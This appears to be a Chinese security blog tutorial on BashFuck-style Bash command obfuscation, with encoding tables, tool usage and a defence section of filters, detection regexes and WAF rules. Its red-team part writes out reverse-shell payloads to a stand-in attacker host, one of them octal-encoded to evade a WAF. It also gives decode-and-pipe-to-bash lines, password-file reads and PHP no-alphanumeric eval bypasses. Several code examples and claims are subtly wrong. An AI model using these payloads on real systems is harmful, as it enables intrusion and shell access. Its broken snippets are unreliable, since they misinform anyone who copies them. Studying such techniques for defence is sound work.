---
title: BashFuck 命令混淆技术详解：原理、实现与防御
date: 2026-04-17 15:00:00 +0800
categories: [Web安全, 渗透测试]
tags: [BashFuck, 命令混淆, RCE绕过, 无字母数字, 红蓝对抗]
description: 深入解析 BashFuck 命令混淆技术的核心原理、实现方法、实际应用场景以及防御措施，帮助安全从业者更好地理解和防范此类攻击技术。
---

## 什么是 BashFuck

BashFuck 是一种基于 Bash Shell 特性的命令混淆技术，它利用 Linux 终端的 `$'\xxx'` 语法特性，将任意命令转换为仅使用极少字符（如 `$`、`(`、`)`、`#`、`!`、`{`、`}`、`<`、`\`、`'` 等）的编码形式。这种技术的核心目标是**在无字母数字的情况下实现任意命令执行**，从而绕过各种安全检测机制。

### 技术背景与起源

BashFuck 的命名灵感来源于著名的 [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck) 编程语言——一种仅使用 8 个指令的极简编程语言。类似地，BashFuck 致力于使用最少的字符集来编写和执行 Bash 命令。

这项技术的诞生源于安全研究者和 CTF 竞赛参与者对命令执行绕过技术的深入研究。在 Web 安全领域，当面对严格的输入过滤（如禁止字母和数字）时，传统的命令注入方法往往失效，而 BashFuck 技术提供了一种创新的解决方案。

### 应用场景概述

BashFuck 技术主要应用于以下场景：

1. **CTF 竞赛**：无字母数字 RCE（远程代码执行）题目的标准解法
2. **红队渗透测试**：绕过 WAF（Web 应用防火墙）和入侵检测系统的静态分析
3. **蓝队防御研究**：生成测试样本，完善检测规则，理解攻击者手法
4. **安全研究**：探索 Shell 的底层特性和边界情况

---

## 核心原理解析

### Linux Shell 的八进制编码特性

BashFuck 技术的核心基础是 Linux Shell 支持的 `$'\xxx'` 语法。这种语法允许使用八进制 ASCII 码来表示字符：

```bash
# 八进制 154 对应字符 'l'，163 对应 's'
echo $'\154\163'  # 输出: ls
```

#### ASCII 码与八进制转换

每个 ASCII 字符都可以用一个三位八进制数表示：

| 字符 | ASCII (十进制) | 八进制表示 |
|------|---------------|-----------|
| `a`  | 97            | `\141`    |
| `b`  | 98            | `\142`    |
| `c`  | 99            | `\143`    |
| `l`  | 108           | `\154`    |
| `s`  | 115           | `\163`    |
| 空格 | 32            | `\040`    |
| `-`  | 45            | `\055`    |

通过这种映射，任何命令都可以转换为纯八进制编码的形式。

#### 单词分割（Word Splitting）机制

在使用 `$'\xxx'` 语法时，需要特别注意 Bash 的**单词分割**机制。单词分割是 Bash 将参数扩展、命令替换和算术扩展的结果分割成多个单词的过程，它发生在双引号之外，并受到 IFS（Internal Field Separator）环境变量的影响。

```bash
# 错误示例：整个字符串被视为一个单词
$'\154\163\040\055\154'  # 被当作 "ls -l" 一个整体

# 正确做法：使用引号分隔参数
$'\154\163' $'\055\154'  # 正确分割为 "ls" 和 "-l"
```

IFS 默认包含空格、制表符和换行符。理解这一机制对于正确构造带参数的命令至关重要。

### 基础编码方法

基于上述原理，我们可以构建基础的八进制编码函数：

```python
def get_oct(char):
    """将字符转换为八进制表示"""
    return format(ord(char), '03o')

def common_otc(cmd):
    """
    将命令转换为 $'\xxx' 格式
    处理命令和参数的分割
    """
    payload = "$'"
    for c in cmd:
        if c == ' ':
            # 空格处结束当前引号，开始新的 $'...'
            payload += "' $'"
        else:
            payload += '\\' + get_oct(c)
    payload += "'"
    return payload

# 示例
print(common_otc("ls -l"))
# 输出: $'\154\163' $'\055\154'
```

#### 实际编码示例

让我们通过几个实际例子来理解编码过程：

**示例 1：简单的 `ls` 命令**

```bash
# 原始命令
ls

# 八进制编码
echo $'\154\163'

# 执行
$($'\154\163')  # 或直接使用 $'\154\163'
```

**示例 2：带参数的 `cat /etc/passwd`**

```bash
# 原始命令
cat /etc/passwd

# 八进制编码
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'

# 验证编码
echo $'\143\141\164'  # 输出: cat
echo $'\057\145\164\143\057\160\141\163\163\167\144'  # 输出: /etc/passwd
```

**示例 3：使用 `$(printf)` 进行编码**

除了 `$'\xxx'` 语法，还可以使用 `printf` 命令：

```bash
# 使用 printf 解码八进制
$(printf "\154\163")  # 执行 ls

# 组合使用
$(printf "\143\141\164") $(printf "\057\145\164\143\057\160\141\163\163\167\144")
```

---

## 进阶混淆技术

### 无字母数字执行

在极端情况下，目标系统可能过滤了所有字母和数字字符。此时需要利用位运算和 Shell 特性来构造所需的字符。

#### 位运算构造字符

**1. 异或运算（XOR）**

异或运算的特性是：相同为 0，不同为 1。利用这一特性，我们可以通过两个非字母数字字符的异或来得到目标字符。

```php
<?php
// '5' 的 ASCII 是 53 (110101)，'Z' 的 ASCII 是 90 (1011010)
// 异或结果: 1101111 = 111 = 'o'
echo "5" ^ "Z";  // 输出: o
?>
```

通过这种方法，可以构造出任意字符。以下是一个生成异或组合的 Python 脚本：

```python
# xor_generator.py
# 生成可用于异或绕过非字母数字过滤的字符组合

def generate_xor_combinations():
    """生成所有可打印字符的异或组合"""
    results = {}
    
    for target in range(32, 127):  # 可打印 ASCII 范围
        target_char = chr(target)
        combinations = []
        
        for i in range(256):
            for j in range(256):
                # 跳过字母数字
                if chr(i).isalnum() or chr(j).isalnum():
                    continue
                if i ^ j == target:
                    combinations.append((i, j))
                    if len(combinations) >= 3:  # 限制结果数量
                        break
            if len(combinations) >= 3:
                break
        
        if combinations:
            results[target_char] = combinations
    
    return results

# 生成并保存结果
results = generate_xor_combinations()
with open('xor_combinations.txt', 'w') as f:
    for char, combos in results.items():
        for combo in combos:
            f.write(f"{char}: %{combo[0]:02x} ^ %{combo[1]:02x}\n")

print("异或组合已保存到 xor_combinations.txt")
```

**2. 或运算（OR）**

类似地，可以使用或运算来构造字符：

```python
# or_generator.py
# 生成可用于或运算绕过非字母数字过滤的字符组合

def generate_or_combinations():
    """生成所有可打印字符的或运算组合"""
    results = {}
    
    for target in range(32, 127):
        target_char = chr(target)
        combinations = []
        
        for i in range(256):
            for j in range(256):
                if chr(i).isalnum() or chr(j).isalnum():
                    continue
                if i | j == target:
                    combinations.append((i, j))
                    if len(combinations) >= 3:
                        break
            if len(combinations) >= 3:
                break
        
        if combinations:
            results[target_char] = combinations
    
    return results

results = generate_or_combinations()
with open('or_combinations.txt', 'w') as f:
    for char, combos in results.items():
        for combo in combos:
            f.write(f"{char}: %{combo[0]:02x} | %{combo[1]:02x}\n")

print("或运算组合已保存到 or_combinations.txt")
```

**3. 取反运算（NOT）**

取反运算可以对字符进行按位取反。对一个字符进行两次取反，会得到原来的值：

```php
<?php
// 取反运算示例
$char = ~'a';  // 对 'a' 取反
$original = ~$char;  // 再次取反得到 'a'
echo $original;  // 输出: a
?>
```

利用这一特性，可以使用非字母数字字符的取反结果来构造目标字符。

#### 自增操作构造字符

PHP 中有一个有趣的特性：字符串可以进行自增操作。

```php
<?php
$a = 'a';
$a++;  // $a 变成 'b'
$a++;  // $a 变成 'c'
// 依此类推...

// 利用数组获取 'a'
$_ = [];
$_ = @"$_";  // 变成 "Array"
$_ = $_['!' == '@'];  // 取第 4 个字符 'a'
?>
```

通过这种方法，可以从一个初始字符出发，通过自增操作获得 a-z 的所有字母。

#### 特殊变量利用

Bash 提供了许多特殊变量，可以在无字母数字的情况下利用：

| 变量 | 含义 | 利用方式 |
|------|------|---------|
| `$@` | 位置参数 | 在交互式 shell 中为空 |
| `$*` | 所有位置参数 | 在交互式 shell 中为空 |
| `$?` | 上一个命令的退出状态 | 通常是数字 |
| `$$` | 当前 shell 的 PID | 数字 |
| `$#` | 位置参数的数量 | 数字 |
| `${#}` | 字符串长度 | 数字 |

利用这些变量，可以构造出数字和空字符串，进而组合成命令：

```bash
# 利用 $@ 插入空字符
c$@at /etc/passwd  # 等同于 cat /etc/passwd

# 利用 $* 插入空字符
wh$*oami  # 等同于 whoami
```

### 多种编码方式

#### Base64 编码绕过

Base64 编码是一种常用的绕过技术：

```bash
# 编码命令
echo 'cat /etc/passwd' | base64
# 输出: Y2F0IC9ldGMvcGFzc3dkCg==

# 解码并执行
echo 'Y2F0IC9ldGMvcGFzc3dkCg==' | base64 -d | bash

# 或使用反引号
`echo 'Y2F0IC9ldGMvcGFzc3dkCg==' | base64 -d`
```

#### Hex 十六进制编码

```bash
# 将命令转换为十六进制
echo "cat /etc/passwd" | xxd -p
# 输出: 636174202f6574632f7061737377640a

# 解码并执行
echo "636174202f6574632f7061737377640a" | xxd -r -p | bash
```

#### 通配符绕过

当某些字符被过滤时，可以使用通配符来匹配命令：

```bash
# 使用 ? 通配符
c?? /etc/passwd  # 匹配 cat

# 使用 * 通配符
c* /etc/passwd   # 匹配 cat, cut 等

# 使用 [] 字符类
[@-[]  # 匹配大写字母 A-Z
```

一个经典的通配符绕过示例：

```bash
# 执行 /bin/cat /etc/passwd
/???/??? ????/??????
# 匹配: /bin/cat /etc/passwd
```

### 其他混淆技巧

#### 变量拼接

```bash
# 使用变量拼接命令
a=c;b=a;c=t;
$a$b$c /etc/passwd  # 等同于 cat /etc/passwd
```

#### 引号混淆

```bash
# 单引号
c''a''t /etc/passwd

# 双引号
c""a""t /etc/passwd

# 反引号
c``a``t /etc/passwd

# 反斜线
c\a\t /etc/passwd
```

#### 注释插入

```bash
# 在命令中插入注释来绕过过滤
system/*comment*/(whoami);
c/*a*/at /etc/passwd
```

#### 利用 PATH 环境变量

```bash
# 从 PATH 中提取字符
${PATH:5:1}  # 通常是 'l'
${PATH:2:1}  # 通常是 's'

# 拼接成命令
${PATH:5:1}${PATH:2:1}  # 输出: ls
```

---

## BashFuck 工具使用

### 原始 BashFuck 工具

GitHub 上的 [0xddaa/bashfuck](https://github.com/0xddaa/bashfuck) 项目提供了一个使用仅 11 个字符（`$`、`(`、`)`、`#`、`!`、`{`、`}`、`<`、`\`、`'`、`,`）来编码任意 Bash 命令的工具。

#### 安装和使用

```bash
# 克隆仓库
git clone https://github.com/0xddaa/bashfuck.git
cd bashfuck

# 使用工具
./bashfuck.sh "cat /etc/passwd"

# 测试模式
./bashfuck.sh -t "ls -la"

# 使用 -b 选项避免使用 ! 字符
./bashfuck.sh -b "whoami"
```

#### 编码示例

```bash
# 原始命令
echo "Hello World"

# BashFuck 编码后（简化示例）
${!#}<<<${!#}$'\\\141\\\142\\\143'
```

### Bashfuscator 框架

[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) 是一个功能更强大的 Bash 混淆框架，采用模块化架构，支持多种混淆技术。

#### 框架架构

Bashfuscator 将混淆功能分为多个模块：

| 模块类型 | 路径 | 功能描述 |
|---------|------|---------|
| 命令混淆器 | `command_obfuscators/` | 大小写交换、命令反转等 |
| 字符串混淆器 | `string_obfuscators/` | 文件通配符、文件夹通配符、十六进制哈希 |
| 编码器 | `encoders/` | Base64、ROT-N、XOR 等 |
| 压缩器 | `compressors/` | Bzip2、Gzip 压缩 |
| 令牌混淆器 | `token_obfuscators/` | 特殊字符、代码混淆 |

#### 安装步骤

```bash
# Debian/Ubuntu 系统
sudo apt-get update
sudo apt-get install python3 python3-pip python3-argcomplete xclip

# RHEL/CentOS 系统
sudo dnf update
sudo dnf install python3 python3-pip python3-argcomplete xclip

# 安装 Bashfuscator
git clone https://github.com/Bashfuscator/Bashfuscator.git
cd Bashfuscator
python3 setup.py install --user
```

#### 基础用法

```bash
# 简单混淆
bashfuscator -c "cat /etc/passwd"

# 复制到剪贴板
bashfuscator -c "whoami" --clip

# 输出到文件
bashfuscator -c "ls -la" -o obfuscated.sh

# 指定混淆级别（1-5）
bashfuscator -c "id" -s 3
```

#### 高级混淆配置

```bash
# 指定特定的混淆模块
bashfuscator -c "cat /etc/passwd" \
  --choose-mutators token/special_char_only compress/bzip2 string/file_glob \
  -s 1

# 使用多个混淆层
bashfuscator -c "whoami" \
  --choose-mutators token/special_char_only string/hex_hash command/reverse \
  -s 2
```

#### 实际输出示例

```bash
# 原始命令
cat /etc/passwd

# Bashfuscator 输出（简化展示）
${@/l+Jau/+<b=k } p''"r"i""n$'t\u0066'  %s  "$(
  ${*%%Frf\[4?T2   } ${*##0\!j.G } "r"'e'v <<< '
  "} ~@{$" ")  }  j@C`\7=-k#*{$ "} ,@{$" ; } ;
  } ,,*{$ "}]  } ,*{$ "} f9deh`\>6/J-F{\,vy//@{$" niOrw$
} QhwV#@{$ [NMpHySZ{$" s% "f"'\'\''4700u\n9600u\r'\'\''$p
...
```

---

## 实际应用场景

### CTF 竞赛

在 CTF 竞赛中，无字母数字 RCE 是一类常见的题目类型。

#### 典型题目场景

```php
<?php
// 题目过滤了所有字母和数字
if(!preg_match('/[a-z0-9]/is', $_GET['shell'])) {
    eval($_GET['shell']);
}
?>
```

#### 解题思路

**方法一：异或构造**

```php
<?php
// 构造 system('ls')
$_ = ('%' ^ '`') . ('&' ^ '@') . ('&' ^ '@') . ('%' ^ '`') . (',' ^ '@') . ('.' ^ '@');
// $_ = 'system'

$__ = '_' . ('-' ^ ']') . ('/' ^ '`') . ('.' ^ ']') . (')' ^ ']');
// $__ = '_POST'

$___ = $$__;
$_($___[_]);
?>
```

**方法二：取反构造**

```php
<?php
// 使用取反运算
$_ = ~'\x8c\x86\x8c\x8b\x9a\x92';  // 取反后得到 'system'
$__ = ~'\x9c\x9e\x8b';  // 取反后得到 'ls'
$_($__);
?>
```

**方法三：临时文件 + 通配符**

当无法直接执行命令时，可以通过上传文件配合通配符执行：

```bash
# 上传包含命令的文件到 /tmp/
# 然后使用通配符执行
. /???/????????[@-[]
```

### 红队渗透测试

在红队行动中，BashFuck 技术可用于：

#### 绕过 WAF 检测

```bash
# 原始 payload（被拦截）
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 八进制编码绕过
$'\142\141\163\150' $'\055\151' $'\076\046' $'\057\144\145\166\057\164\143\160\057\141\164\164\141\143\153\145\162\056\143\157\155\057\064\064\064\064' $'\060\076\046\061'
```

#### 绕过静态分析

```bash
# 使用变量和拼接混淆
a=b;b=a;c=s;h=h;
$a$b$c$h -c "${a}ash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
```

### 蓝队防御研究

蓝队可以使用 Bashfuscator 生成大量测试样本：

```bash
#!/bin/bash
# 生成测试样本脚本

commands=("ls" "cat /etc/passwd" "whoami" "id" "uname -a")

for cmd in "${commands[@]}"; do
    for i in {1..10}; do
        bashfuscator -c "$cmd" -s $((RANDOM % 3 + 1)) >> test_samples.txt
        echo "---" >> test_samples.txt
    done
done
```

---

## 防御措施

### 输入过滤

#### 危险字符过滤

```php
<?php
// 过滤危险字符
function sanitize_input($input) {
    $dangerous = ['$', '(', ')', '`', '|', '&', ';', '<', '>'];
    foreach ($dangerous as $char) {
        $input = str_replace($char, '', $input);
    }
    return $input;
}
?>
```

#### 命令注入检测

```python
import re

def detect_command_injection(input_str):
    """检测潜在的命令注入"""
    patterns = [
        r'\$\{?\w+\}?',  # 变量引用
        r'\$\'.*?\'',     # $'...' 语法
        r'\$\(.*?\)',     # 命令替换
        r'`.*?`',         # 反引号
        r'[0-7]{3}',      # 八进制编码
        r'\\x[0-9a-f]{2}', # 十六进制编码
    ]
    
    for pattern in patterns:
        if re.search(pattern, input_str, re.IGNORECASE):
            return True
    return False
```

#### 白名单机制

```php
<?php
// 使用白名单验证输入
function validate_command($input) {
    $allowed_commands = ['ls', 'cat', 'echo', 'pwd'];
    $parts = explode(' ', $input);
    $command = $parts[0];
    
    if (!in_array($command, $allowed_commands)) {
        return false;
    }
    
    // 验证参数
    foreach ($parts as $part) {
        if (preg_match('/[\$\;\|\&\`\(\)\<\>]/', $part)) {
            return false;
        }
    }
    
    return true;
}
?>
```

### 系统加固

#### 禁用危险函数

```ini
; php.ini 配置
disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close,popen,dl,eval
```

#### 最小权限原则

```bash
# 创建受限用户
useradd -s /bin/rbash -d /home/restricted restricted_user

# 使用 chroot 限制访问
chroot /var/jail /bin/bash

# 使用 SELinux/AppArmor 限制进程权限
```

#### 命令执行监控

```bash
#!/bin/bash
# 命令执行监控脚本

LOG_FILE="/var/log/command_monitor.log"

# 监控危险命令
auditctl -a always,exit -F arch=b64 -S execve -k command_execution

# 实时告警
tail -f /var/log/audit/audit.log | while read line; do
    if echo "$line" | grep -q "bash\|sh\|python\|perl"; then
        echo "[ALERT] Suspicious command detected: $line" >> $LOG_FILE
        # 发送告警通知
        # send_alert "$line"
    fi
done
```

### WAF 防护

#### 规则配置

```nginx
# Nginx WAF 规则
location / {
    # 检测 $'...' 语法
    if ($request_uri ~* \$\'.*\') {
        return 403;
    }
    
    # 检测八进制编码
    if ($request_uri ~* \\[0-7]{3}) {
        return 403;
    }
    
    # 检测命令替换
    if ($request_uri ~* \$\(.*\)) {
        return 403;
    }
    
    proxy_pass http://backend;
}
```

#### 行为分析

```python
# 基于行为的异常检测
class CommandBehaviorAnalyzer:
    def __init__(self):
        self.baseline = {}
        self.threshold = 0.8
    
    def analyze(self, command):
        """分析命令行为"""
        features = {
            'length': len(command),
            'special_chars': len([c for c in command if not c.isalnum()]),
            'encoding_patterns': self._detect_encoding(command),
            'obfuscation_score': self._calculate_obfuscation(command)
        }
        
        # 与基线比较
        anomaly_score = self._compare_baseline(features)
        
        if anomaly_score > self.threshold:
            return 'suspicious'
        return 'normal'
    
    def _detect_encoding(self, command):
        """检测编码模式"""
        patterns = {
            'octal': r'\\[0-7]{3}',
            'hex': r'\\x[0-9a-f]{2}',
            'base64': r'[A-Za-z0-9+/]{20,}={0,2}'
        }
        
        scores = {}
        for name, pattern in patterns.items():
            matches = re.findall(pattern, command)
            scores[name] = len(matches)
        
        return scores
    
    def _calculate_obfuscation(self, command):
        """计算混淆程度"""
        # 统计特殊字符比例
        special_ratio = sum(1 for c in command if c in '$()`\'"') / len(command)
        return special_ratio
```

---

## 局限性与注意事项

### 系统兼容性

BashFuck 技术存在一定的系统依赖性：

| Shell 类型 | 兼容性 | 说明 |
|-----------|-------|------|
| Bash      | 完全支持 | 所有特性可用 |
| Dash      | 部分支持 | 某些语法可能不兼容 |
| Zsh       | 大部分支持 | 基本功能可用 |
| Sh        | 有限支持 | 取决于实际指向 |

**注意**：在 Debian/Ubuntu 系统中，`/bin/sh` 通常指向 Dash；在 CentOS/RHEL 系统中，`/bin/sh` 通常指向 Bash。这种差异可能影响某些混淆技术的有效性。

### 执行效率影响

混淆后的命令通常比原始命令执行更慢，原因包括：

1. **解码开销**：需要额外的解码步骤
2. **字符串操作**：大量的字符串拼接和替换
3. **命令替换**：多层嵌套的命令替换

### 法律与道德边界

**重要提醒**：

1. **合法授权**：仅在获得明确授权的系统和网络上使用这些技术
2. **教育目的**：本文仅供学习和研究使用
3. **遵守法律**：未经授权的渗透测试是违法行为
4. **道德责任**：安全研究者应当负责任地披露漏洞

---

## 总结与展望

### 技术发展趋势

BashFuck 和命令混淆技术正在不断发展：

1. **AI 驱动的混淆**：使用机器学习生成更难检测的混淆代码
2. **多态混淆**：每次生成不同的混淆形式，绕过签名检测
3. **上下文感知**：根据目标环境动态选择最优混淆策略
4. **自动化工具**：更智能的混淆框架和工具

### 防御建议

对于防御方，建议采取以下措施：

1. **多层防御**：不要依赖单一检测机制
2. **行为分析**：关注异常行为而非静态特征
3. **最小权限**：严格限制命令执行权限
4. **持续监控**：实时监控和日志分析
5. **定期审计**：定期审查和更新安全策略

### 学习资源推荐

#### 参考链接

- [GitHub - 0xddaa/bashfuck](https://github.com/0xddaa/bashfuck)
- [GitHub - Bashfuscator/Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [Bashfuscator 官方文档](https://bashfuscator.readthedocs.io/)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

#### 相关工具

- **Bashfuscator**：强大的 Bash 混淆框架
- **Shellter**：Shell 脚本混淆工具
- **Obfuscator**：多语言代码混淆工具

#### 推荐书籍

- 《Web安全深度剖析》
- 《渗透测试实战》
- 《白帽子讲Web安全》
- 《Metasploit渗透测试指南》

---

## 附录：常用编码速查表

### ASCII 转八进制

```
a: \141  b: \142  c: \143  d: \144  e: \145  f: \146
g: \147  h: \150  i: \151  j: \152  k: \153  l: \154
m: \155  n: \156  o: \157  p: \160  q: \161  r: \162
s: \163  t: \164  u: \165  v: \166  w: \167  x: \170
y: \171  z: \172

A: \101  B: \102  C: \103  D: \104  E: \105  F: \106
...

0: \060  1: \061  2: \062  3: \063  4: \064  5: \065
6: \066  7: \067  8: \070  9: \071

空格: \040  -: \055  /: \057  .: \056
```

### 常用命令编码

```bash
# ls
$'\154\163'

# cat
$'\143\141\164'

# whoami
$'\167\150\157\141\155\151'

# id
$'\151\144'

# bash
$'\142\141\163\150'
```

---

*本文仅供学习交流使用，请勿用于非法用途。安全研究应当在合法授权的前提下进行。*
